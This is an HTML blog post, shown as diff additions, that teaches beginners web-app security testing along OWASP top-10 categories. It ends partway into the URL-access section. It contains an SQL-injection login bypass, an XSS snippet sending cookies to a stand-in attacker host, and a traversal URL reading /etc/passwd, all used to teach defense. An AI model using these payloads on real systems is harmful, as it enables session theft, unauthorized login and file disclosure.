@@ -1,0 +1,404 @@
+<div style="background-color: white; border: 1px solid black; padding: 10px;">
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">I joined a project team a couple of years ago. The team was writing the payment gateway integration from scratch making security testing important, and thus grabbing my interest all the more. </span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">Since I spent time searching, reading up, contacting people and using some tools, why not do away with this time for someone else?</span></p>
+    <p></p>
+    <h3><span style="font-family: calibri, verdana, arial, sans-serif;">This blogpost is for you if:</span></h3>
+    <ul>
+        <li><span style="font-family: calibri, verdana, arial, sans-serif;">You are a novice and want to start with some basic security testing on web apps. This post is an attempt to collate</span>
+            <ul>
+                <li><span style="font-family: calibri, verdana, arial, sans-serif;">different types of primary security testing techniques</span></li>
+                <li><span style="font-family: calibri, verdana, arial, sans-serif;">tool details that can be used for testing</span></li>
+                <li><span style="font-family: calibri, verdana, arial, sans-serif;">examples of testing/defects from the project I worked on</span></li>
+                <li><span style="font-family: calibri, verdana, arial, sans-serif;">further reading materials</span></li>
+            </ul>
+        </li>
+        <li><span style="font-family: calibri, verdana, arial, sans-serif;">You an expert and would like to share your comments to keep interested people like us on</span><span style="font-family: calibri, verdana, arial, sans-serif;"> the correct track</span></li>
+    </ul>
+    <p></p>
+</div>
+<div style="padding: 10px;"></div>
+<div style="background-color: white; border: 1px solid black; padding: 10px;">
+    <p></p>
+    <h3><span style="font-family: calibri, verdana, arial, sans-serif;">The testing:</span></h3>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">&nbsp;</span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">Before you proceed, do remember - <strong>What you need, first and foremost, is the ability to think out of the box and from a possible (intentional or not) attacker's perpective. </strong></span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">Security threats are not necessarily a rogue person, they could be malicious websites, software or even flawed design in your own application. </span></p>
+    <p></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">List of topics covered ahead:</span></p>
+    <ul style="list-style-type: circle;">
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#injection">Injection</a> <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#xss">Cross-site scripting (XSS)</a> <span style="font-size: 10pt;"> (listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#session">Broken Authentication and session management</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#dor">Insecure direct Object reference</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#csrf">Cross-site request forgery (CSRF)</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#misconfig">Security misconfiguration</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#crypto">Insecure cryptographic Storage</a> <span style="font-size: 10pt;"> (listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#restricturl">Failure to restrict URL access</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#layer">Insufficient transport layer protection</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#redirects">Unvalidated redirects and forwards</a>&nbsp; <span style="font-size: 10pt;">(listed as OWASP top 10 vulnerability)</span></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#cookie">Cookie poisoning</a></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#business">Business workflow vulnerabilities</a></span></li>
+        <li><span style="font-size: 12pt; font-family: calibri, verdana, arial, sans-serif;"><a href="#tools">Summary of tools</a></span></li>
+    </ul>
+    <p></p>
+</div>
+<div style="padding: 10px;"></div>
+<div style="background-color: white; border: 1px solid black; padding: 10px;">
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="injection"></a><span style="font-size: 12pt;"><strong>Injection</strong></span></p>
+        <p></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>Imagine a situation... an English-speaking bank executive serves you with your account details. You gave him instructions in Spanish (that you know the man who maintains the files will understand) to fetch you the details of your neighbour's account. The bank executive had no clue how to interpret it and just repeated the same sentence in Spanish to the bank's file-keeper. The file-keeper understood the language and so gave what the executive asked for, which was brought to you. Now you can misuse this information in any way you like.</em></span></p>
+        <p></p>
+        <p>This is very similar to injections in web applications.</p>
+        <p>Injection flaw can allow m<span style="background-color: #f5f5f5;">alicious instructions to fetch hidden data, corrupt/destroy stored content, modify data, or even completely takeover the host.</span></p>
+        <p></p>
+        <p>When you see input boxes, form information, URL's etc., scenarios around injection attacks should strike you.</p>
+        <p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">You could inject at various levels - ASP, shell, database etc.</span></p>
+        <p>One of the most common (and oldest) techniques is SQL injection.</p>
+        <p><strong>&nbsp;</strong></p>
+        <p>SQL Injection is the technique by which you pass SQL commands through a web application, that are executed by the backend database.</p>
+        <p>A simple example of this would be:</p>
+        <p>On the login page, insert username as <span style="color: #993366;"><em>' OR 1=1--'</em></span> . Enter any junk in the password field, (say <span style="color: #800080;"><em>blah</em></span>).</p>
+        <p>So in the backend, this is the query that is running (in all probability): <span style="color: #993366;"><em>Select * from users where username = '</em></span><span style="color: #800080;"><em><span style="color: #993366;">'</span> OR 1=1--' <span style="color: #993366;">'</span></em></span><span style="color: #993366;"><em> and password=</em></span>'<span style="color: #800080;"><em>blah</em></span>'</p>
+        <p>Since -- is the convention in SQL to comment code, the final query to be executed will be <span style="color: #993366;"><em>Select * from users where username='' OR 1=1.</em></span></p>
+        <p>As 1=1 is always true, this query shall never fail. So, even without knowing the valid credentials, you will be allowed to login.</p>
+        <p>Imagine what you could be doing with a DROP TABLE command <img class="jive_macro jive_emote" src="/images/emoticons/happy.png" jivemacro="emoticon" ___jive_emoticon_name="happy" /></p>
+        <p><span style="text-decoration: underline;">&nbsp;</span></p>
+        <p><span style="text-decoration: underline;">Tools/Aids</span>:</p>
+        <p><a class="active_link" href="http://ha.ckers.org/sqlinjection/" title="http://ha.ckers.org/sqlinjection/">SQL Injection Cheat sheet: Esp: for filter evasion - by RSnake</a> mentions some simple SQL injection techniques for basics</p>
+        <p><a class="active_link" href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="http://pentestmonkey.net/category/cheat-sheet/sql-injection">SQL Injection | pentestmonkey</a> has a good list of cheat sheets by database types</p>
+        <p><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" title="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">SQL Injection Prevention Cheat Sheet - OWASP</a> mentions ways to avoid SQL injections in your code.</p>
+        <p>Apart from manual testing, I used <a href="https://addons.mozilla.org/en-us/firefox/addon/sql-inject-me/" title="https://addons.mozilla.org/en-us/firefox/addon/sql-inject-me/">SQL Inject Me :: Add-ons for Firefox</a> which has a couple of common malicious SQL queries stored. You can add to the list and run the tool to inject the queries in your form and analyse the output rendered from the page.</p>
+        <p><a href="http://code.google.com/p/zaproxy/" title="http://code.google.com/p/zaproxy/">Zaproxy -&nbsp; OWASP ZAP</a> is a web application penetration tool that also gives you a way to test SQL injection flaws. You can find a demo video for the same <a href="http://www.youtube.com/watch?v=5RmHyZkQo_8&amp;feature=plcp">here</a>.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="xss"></a><span style="font-size: 12pt;"><strong>Cross-site scripting (XSS)</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-size: 10pt; font-family: 'comic sans ms', sans-serif;"><em>There was a notice stuck to our building's notice board which said "If you want to win a lottery, place your thumb on the pad next to this notice". People gladly came and placed their thumbs on the pad, which they did not know was actually a fingerprint scanner/reader I had put up. Now I had their fingerprints that I could use to access biometric systems.</em></span></p>
+        <p><span style="font-size: 10pt;">Well, I did not actually do it, but if I did, it would have been a good example of XSS. Please note, the notice board was a medium of the malicious contents while the victims were users of this board.</span></p>
+        <p><span style="font-size: 10pt;">&nbsp;</span></p>
+        <p><span style="font-size: 10pt;">XSS is the concept of planting scripts by misusing the powers of HTML, CSS, javascript etc. The victim of XSS is usually another user, instead of the host server itself (which is just a medium).</span></p>
+        <p><span style="font-size: 10pt;">Imagine you are at your favourite site and it asks you to click on a popup with exciting offers/discounts. You click on it only to realise your cookie information has been compromised. Or maybe a worm program has been propagated to your account.</span></p>
+        <p class="p1"></p>
+        <p class="p1">In 2001 it was shown that Hotmail was vulnerable to XSS. An attacker could send an email containing:</p>
+        <p class="p2"><span style="color: #993366;"><em>&lt;html&gt;&lt;body&gt;</em></span></p>
+        <p class="p2"><span style="color: #993366;"><em>&lt;style type="application/x-javascript"&gt;</em></span></p>
+        <p class="p2"><span style="color: #993366;"><em>alert('You are in danger');</em></span></p>
+        <p class="p2"><span style="color: #993366;"><em>&lt;/style&gt;</em></span></p>
+        <p class="p2"><span style="color: #993366;"><em>&lt;/body&gt;&lt;/html&gt;</em></span></p>
+        <p class="p3">Netscape Navigator would run <span style="color: #993366;"><em>style</em></span> tag as a javascript tag. The script would run in the browser of the person on the Hotmail mailbox. This script would just display an alert box.</p>
+        <p class="p3">Now, if a hacker wanted, he could alter this script to add the following snippet</p>
+        <p class="p2"><span style="color: #993366;"><em><span>document.location.replace( "</span><a class="jive-link-external-small unlinked">http://www.i-am-a-hacker.example/stealstuff.php</a><span>" </span></em></span><span style="color: #993366;"><em>+ "?what=" + document.cookie)</em></span></p>
+        <p class="p3">This would have passed the sessionId cookie to the attacker's web server. The attacker would in turn install the cookie in his own browser, and visit Hotmail to read all the mail of the victim. How cool is that?</p>
+        <p class="p1"></p>
+        <p>Now in your own application, do you have parameters input by query string arguments (like a search box or login or registration) that writes the parameter to your page? This could be where you can start sanitising.</p>
+        <p>Let's take the search box in <a href="http://xss.triviasecurity.org/xss/one.php">this page</a>. Put in a simple <span style="color: #993366;"><em>&lt;s&gt; </em></span>as the search string and notice the text displayed has a strikethrough. This is a simple check that HTML is being executed in this page. Now view the page source and analyse where the search-string is being used, and go bonkers with various scenarios.</p>
+        <p><span style="text-decoration: underline;">&nbsp;</span></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="http://www.youtube.com/watch?v=qO3iwAxkPxE&amp;feature=fvwrel" title="http://www.youtube.com/watch?v=qO3iwAxkPxE&amp;feature=fvwrel">Cross Site Scripting Attack Demo - YouTube</a> is a simple demo example for XSS</p>
+        <p><a href="http://www.veracode.com/security/xss" title="http://www.veracode.com/security/xss">XSS Cheat Sheet: Prevent Cross Site Scripting Attacks, Injections | Veracode</a> explains XSS quite well, from the basics</p>
+        <p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" title="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet - OWASP</a> mentions some simple XSS techniques for cheat sheet</p>
+        <p><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" title="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet - OWASP</a> provides tips on how to prevent XSS in your code</p>
+        <p>Like SQL Inject-Me, there is an <a href="https://addons.mozilla.org/en-us/firefox/addon/xss-me/" title="https://addons.mozilla.org/en-us/firefox/addon/xss-me/">XSS Me :: Add-ons for Firefox</a> too. It comes loaded with some common XSS queries and special characters (that are used for XSS attacks very frequently). However, manual intervention in testing is very much required.</p>
+        <p><span style="font-size: 10pt;"><a href="http://code.google.com/p/zaproxy/" title="http://code.google.com/p/zaproxy/">Zaproxy -&nbsp; OWASP ZAP</a> is a web application penetration tool that also gives you a way to test XSS in depth. You can find a demo video for the same <a href="http://www.youtube.com/watch?v=rmbi-VbIK6I&amp;feature=plcp">here</a>. <br /></span></p>
+        <p><span style="font-size: 10pt;">&nbsp;</span></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="session"></a><span style="font-size: 12pt;"><strong>Broken Authentication and session management</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>I called my dad's office phone and asked him to get me some precious stuff from my locker. I gave him the passcode and all the details he would require to access my locker. But before he reached there, someone had already robbed the locker.</em></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>My dad and I thought of what happened and devised a secret key algorithm between ourselves. It was our own coded language.</em></span></p>
+        <p><em><span style="font-family: 'comic sans ms', sans-serif;">Next time when I had to share sensitive information with him, I would not call him on his office phone (which could be easily tapped), and we would talk in our little coded language. And that's how we outsmarted the petty thieves.</span> </em><img class="jive_macro jive_emote" src="/images/emoticons/happy.png" jivemacro="emoticon" ___jive_emoticon_name="happy" /></p>
+        <p></p>
+        <p>Protecting credentials and session details is one of the most important and difficult tasks to track.</p>
+        <p>Usually to know how well you are protected, you might need to just ask yourself and answer a few questions, such as:</p>
+        <p>- are you using login/forgot password/payment pages etc. over a secured, encrypted page?</p>
+        <p>- have you ensured that user is assigned a new session cookie everytime he logs in? Also, the older cookie should no longer be active. This will prevent session hijacking.</p>
+        <p>- ensure you have an SSL certificate in place before putting your web application open to public.</p>
+        <p>- check if your url gives away any session information.</p>
+        <p>- can the forget-password token be used multiple times?</p>
+        <p></p>
+        <p>Some tests that we performed on our project apart from the above, included the session data across our web application and the payment gateway. Session data may include hashed data, session timeouts, session cookie information etc.</p>
+        <p>For login page, you have a secured page, passing encrypted data, SQL injections etc. are all checked. But still you may give away secured information by minor mistakes. You must have noticed login pages where entering an invalid data give specific error messages such as "Invalid email address" or "invalid password". Well, that's not good. Your messages should always be generic as 'invalid email address/password". It gives lesser chances for the attacker to guess a valid email/password.</p>
+        <p>Also having minimum validations on password strength is a good idea. Tools such as <a href="https://addons.mozilla.org/en-us/firefox/addon/fireforce/" title="https://addons.mozilla.org/en-us/firefox/addon/fireforce/">Fireforce :: Add-ons for Firefox</a> allow attackers to guess weak passwords quite easily.</p>
+        <p>Similar is the case for 'forgot password'. When you enter an non-registered email address in 'forgot password', you may see a message that the&nbsp; "email address is not registered". This again gives away information. So, whether registered or not, it is a good idea to just simply say "an email will be sent to reset the password", while in the backend, you send a mail only if he is registered.</p>
+        <p><span>Another interesting scenario in 'forgot password' could be trying to crack the token you receive in the forgot password URL. Usually you are asked to click on a link to reset your password which looks like </span><span style="color: #993366;"><a class="jive-link-external-small unlinked"><span style="color: #993366;">https://my_website/forgot_password?token=89ADjk899j8k</span></a></span></p>
+        <p>What would I test here? Is there a way to capture the token?</p>
+        <p>I may try the forget password functionality multiple times and notice the tokens. Do they show a pattern (sequentially progressive numbers etc.) that can easily be cracked?</p>
+        <p>I may also try capturing information dumps between the client and the server when I submit the 'forgot password' form. Do any of these HTML/json dumps consist of the token? If yes, then an attacker can directly use it to change the password.</p>
+        <p><span style="text-decoration: underline;">&nbsp;</span></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="https://addons.mozilla.org/en-us/firefox/addon/firebug/" title="https://addons.mozilla.org/en-us/firefox/addon/firebug/">Firebug :: Add-ons for Firefox</a> or <a href="https://chrome.google.com/webstore/detail/firebug-lite-for-google-c/bmagokdooijbeehmkpknfglimnifench" title="https://chrome.google.com/webstore/detail/firebug-lite-for-google-c/bmagokdooijbeehmkpknfglimnifench">Chrome Web Store - Firebug Lite for Google Chrome&trade;</a> are good to capture and observe request/responses</p>
+        <p><a href="https://chrome.google.com/webstore/detail/http-headers/hplfkkmefamockhligfdcfgfnbcdddbg" title="https://chrome.google.com/webstore/detail/http-headers/hplfkkmefamockhligfdcfgfnbcdddbg">Chrome Web Store - HTTP Headers</a> is a good tool to man the header requests/responses</p>
+        <p><a href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/" title="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/">Tamper Data :: Add-ons for Firefox</a> is one of the best tools to pause and tamper every request between the client and server.</p>
+        <p><a href="http://code.google.com/p/zaproxy/" title="http://code.google.com/p/zaproxy/">Zaproxy -&nbsp; OWASP ZAP</a> is a web application penetration tool that allows users to intercept traffic and modify requests too. You can find a demo video for the same <a href="http://www.youtube.com/watch?v=lXoJQz6uIQ0&amp;feature=plcp">here</a>.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="dor"></a><span style="font-size: 12pt;"><strong>Insecure direct Object reference</strong></span></p>
+        <p><span style="font-size: 12pt; font-family: 'comic sans ms', sans-serif;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>My friend lives in a neighbourhood where people trust each other. They would never lock the doors to their houses. They left the car-keys in the car itself. They never thought anything bad could happen to them.</em></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>Guess what happened? Rogues from other towns got to know of this naive neighbourhood and gleefully stole all they could to their heart's content.</em></span></p>
+        <p></p>
+        <p>In your project, make sure all the internal information such as files, URLs, database records are not open for direct access.</p>
+        <p>A simple example of finding a vulnerability could be through URL's. Notice this :<span style="color: #993366;"><span> </span><a class="jive-link-external-small unlinked">http://my_website/my_file.jsp?file=foo.txt</a></span></p>
+        <p>An attacker can easily modify this using <a href="http://en.wikipedia.org/wiki/Directory_traversal_attack">Directory Traversal attack</a> and access <span style="color: #993366;"><a class="jive-link-external-small unlinked">http://my_website/my_file.jsp</a><span>?file=**../../../../etc/passwd</span></span></p>
+        <p>This will fetch the /etc/passwd file and it will be rendered by <span style="color: #993366;"><em>my_file.jsp</em></span>.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn" title="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn">Chrome Web Store - Websecurify</a> is a Chrome plugin that lists all the general security flaws in a website. It also shows if your website has exposed directory listing.</p>
+        <p><a href="http://code.google.com/p/zaproxy/" title="http://code.google.com/p/zaproxy/">Zaproxy -&nbsp; OWASP ZAP</a> is a web application penetration tool to use brute force to locate hidden directories. A video of the demo can be found <a href="http://www.youtube.com/watch?v=9WG8c--eYOs&amp;feature=plcp">here</a>.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="csrf"></a><span style="font-size: 12pt;"><strong>Cross-site request forgery (CSRF)</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>Do you remember the little story I told you in <a href="#xss">the XSS section</a>? Did you not wonder how did the building's security not object against my putting up untrusted content on the building's board?</em></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>Well, there is a little twist to the story. What the victims thought was the building's notice board, was actually a mock board I had put up on the way. And no one, but I, have the authority to decide what goes up on my board. The victims were just fooled because I made them believe that they were looking at a genuine board.</em></span></p>
+        <p></p>
+        <p>Similarly how does XSS etc. get posted on the hosting server? Well, it didn't. For all you know, an attacker just intercepted the path of the victim and made him move away from the hosting server to my rogue website.</p>
+        <p></p>
+        <p>CSRF attacks could work via a menacing web application opened maybe in a separate browser tab to the target application. Or it could follow when that application does not clean up user credentials when the user navigates away to a rogue website.</p>
+        <p>Users' privileges can be misused to cause server-side actions or also retrieve confidential data (for example, <a href="http://searchsecurity.techtarget.com/definition/JavaScript-hijacking">JavaScript Hijacking</a> attacks). Since CSRF is executed by tricking a user to perform HTTP requests via his own IP address, it can get tough to log tracks of CSRF.</p>
+        <p></p>
+        <p>One of the many ways adopted by websites to prevent CSRF attacks is by providing a secret, user-specific token in all form submissions.</p>
+        <p>This could be a point of sanity testing on your web application. Notice, using firebug, that there would be an authenticity token being used by your browser. Before you perform a post request, such as login, create/update/delete operations, try removing this token and then proceed. If it allows you to proceed with the operation, then your server is not validating the authenticity token. This is a common problem found in rails applications where CSRF has not been explicitly handled.</p>
+        <p>Transactions that include multiple steps can be potential targets for CSRF. So when testing payment integration flows, it is important to keep an eye on the hash token passed on and authenticated at each step. If the steps are vulnerable to CSRF, I maybe able to intercept and transfer money to my bank instead of the vendor's.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OWASP-SM-005)" title="https://www.owasp.org/index.php/Testing_for_CSRF_(OWASP-SM-005)">Testing for CSRF (OWASP-SM-005) - OWASP</a> covers pretty much all the links to useful material around CSRF-related testing</p>
+        <p><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery" title="http://en.wikipedia.org/wiki/Cross-site_request_forgery">Cross-site request forgery - Wikipedia, the free encyclopedia</a> is a good read to understand CSRF and its prevention methods</p>
+        <p><a href="https://addons.mozilla.org/en-us/firefox/addon/firebug/" title="https://addons.mozilla.org/en-us/firefox/addon/firebug/">Firebug :: Add-ons for Firefox</a> is a good tool to monitor and play around with tokens etc.</p>
+        <p><a href="https://www.owasp.org/index.php/Csrftester">OWASP CSRFTester</a> is a tool that can be used for imitating CSRF attacks. A demo video can be found <a href="http://www.youtube.com/watch?v=t6QcRoIjpwI">here</a>.</p>
+        <p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" title="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet - OWASP</a> is a good reading material for CSRF prevention list</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="misconfig"></a><span style="font-size: 12pt;"><strong>Security misconfiguration</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>The little boy who lives next-door is a menace! He did not want to study and wished so hard the lights would go off. Then he decided to take the task in his own hands. He went to main power supply box and threw a cup of water on some naked electrical wires, thus bringing down the electricity of the whole building. The little imp knew exactly what electrical circuits are vulnerable to and took advantage of it.</em></span></p>
+        <p></p>
+        <p>Remember an attacker thinks deep, even as deep as your development framework, OS, database system et al.</p>
+        <p>It is important to understand the vulnerabilities of the systems in use, and hence make sure the libraries are updated with the fixes.</p>
+        <p></p>
+        <p>Ruby on Rails has a couple of known vulnerabilities in different versions, unless explicitly handled.</p>
+        <p>CSRF tokens not validated has already been mentioned above.</p>
+        <p>Versions below 2.3.4 would consist of XSS vulnerabilities too.</p>
+        <p>Also Rails was found susceptible to <a href="http://codahale.com/a-lesson-in-timing-attacks/">timing attacks</a> (also in Java applications on using MessageDigest.isEquals), which means an attacker can work his way through message digests in a cookie by observing the time taken by the system to execute the algorithms.</p>
+        <p>Also, while we follow ruby best practices, we expose urls with indices such as /user/5. When posting, say, change password request, the post on my application said <span class="nodeLabelBox repTarget "><span style="color: #993366;"><em><span class="nodeAttr editGroup "><span class="nodeName editable ">class</span>="<span class="nodeValue editable ">edit_user</span>"</span><span class="nodeAttr editGroup "> <span class="nodeName editable ">method</span>="<span class="nodeValue editable ">post</span>"</span></em></span><span class="nodeAttr editGroup "><span style="color: #993366;"><em> <span class="nodeName editable ">action</span>="<span class="nodeValue editable ">/users/5</span>"</em></span> . Now if I change the '5' to say '1', I may be changing the password of some other user at index '1'. So following the best practices may not always be the best thing to do.</span></span></p>
+        <p>Also Ruby on Rails was found to have mass assignment vulnerability, that was also shown to have <a href="http://www.infoq.com/news/2012/03/GitHub-Compromised">existed on Github</a>.</p>
+        <p><span class="nodeLabelBox repTarget "><span class="nodeAttr editGroup ">&nbsp;</span></span></p>
+        <p>TLS 1.1 onwards <a href="http://luxsci.com/blog/is-ssltls-really-broken-by-the-beast-attack-what-is-the-real-story-what-should-i-do.html">BEAST</a> and <a href="http://en.wikipedia.org/wiki/Cipher_block_chaining#Cipher-block_chaining_.28CBC.29">Cipher block chaining</a> attacks were handled. So using a version below that can be susceptible to the same.</p>
+        <p></p>
+        <p>It is hence important to also protect your application from banner disclosures. If we list the details of the applications used in building our application, someday someone might report a vulnerability on the same versions. And before we upgrade, an attacker might have already misused it.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn" title="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn">Chrome Web Store - Websecurify</a> is a Chrome plugin that lists all the general security flaws in a website. It also shows if your website has exposed directory listing.</p>
+        <p><a class="active_link" href="https://addons.mozilla.org/en-us/firefox/addon/firebug/" title="https://addons.mozilla.org/en-us/firefox/addon/firebug/">Firebug :: Add-ons for Firefox</a> or <a href="https://chrome.google.com/webstore/detail/firebug-lite-for-google-c/bmagokdooijbeehmkpknfglimnifench" title="https://chrome.google.com/webstore/detail/firebug-lite-for-google-c/bmagokdooijbeehmkpknfglimnifench">Chrome Web Store - Firebug Lite for Google Chrome&trade;</a> are good to capture and observe request/responses</p>
+        <p><a href="http://brakemanscanner.org/" title="http://brakemanscanner.org/">Brakeman - Rails Security Scanner</a> is specifically designed to statically analyse the code written in Ruby on Rails (white-box testing). It checks for typical coding errors which opens the doors for security breaches. If you happen to use the Hudson/Jenkins continuous integration tool, there is a Brakeman plugin for it.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="crypto"></a><span style="font-size: 12pt;"><strong>Insecure cryptographic Storage</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>My dad and I have secret language of our own. We used to code some part of our conversation when we did not want others to understand. But we underestimated my mom. She listened carefully and observed a pattern in our codes. And that's how she already knew about the surprise party we had planned for her birthday.</em></span></p>
+        <p></p>
+        <p>If we have encrypted our data while storage. Does that mean we are protected? Well, not necessarily.</p>
+        <p>Did you make sure you have encrypted all the data that need to be encrypted? Not just passwords, but card information, sensitive records, pin numbers etc.?</p>
+        <p>It is important to use a strong encryption algorithm and salts in your hash keys. However we should also be aware of the vulnerabilities with the algorithms used. For example, MD5/SHA1 has already been cracked multiple times, and is no more considered secured enough.</p>
+        <p>And what about users (most typically admins) who have access to read this information in decrypted format. Can that be compromised?</p>
+        <p>The best way to test that would be to make sure the channels/networks are secured and so are the authentication mechanisms.</p>
+        <p>For payment integration, by PCI DSS requirements, we are supposed to protect card holder information. The best alternative is to not store card information at all. And whatever you store, you are never allowed to store the CVV number. So it is also useful to be aware of such compliances that you are supposed to abide by.</p>
+        <p></p>
+        <p>Neither black box manual testing, nor tools may prove to be of much help in testing this. Code reviews are the best way to determine how securely you are using cryptographic storage.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a class="active_link" href="http://www.veracode.com/security/insecure-crypto" title="http://www.veracode.com/security/insecure-crypto">Insecure Cryptographic Storage - Veracode</a></p>
+        <p><a href="http://www.troyhunt.com/2011/06/owasp-top-10-for-net-developers-part-7.html" title="http://www.troyhunt.com/2011/06/owasp-top-10-for-net-developers-part-7.html">Troy Hunt: OWASP Top 10 for .NET developers part 7: Insecure Cryptographic Storage</a> shows the use of a tool called RainbowCrack to load and crack the weak hashes used in a website.</p>
+        <p><a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet" title="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet">Cryptographic Storage Cheat Sheet - OWASP</a></p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="restricturl"></a><span style="font-size: 12pt;"><strong>Failure to restrict URL access</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>My friend leaves the key to his house under the mat outside the door. He thought he had hidden it well-enough, but the fact that the mat was accessible by absolutely anyone did not favour him much. The key is very much within public access. Woops!</em></span></p>
+        <p></p>
+        <p>'Failure to restrict URLs' is as simple as unauthorized users allowed to view content that they shouldn't have the ability to view.</p>
+        <p>The solution is to apply proper control policies on the page URLs.</p>
+        <p></p>
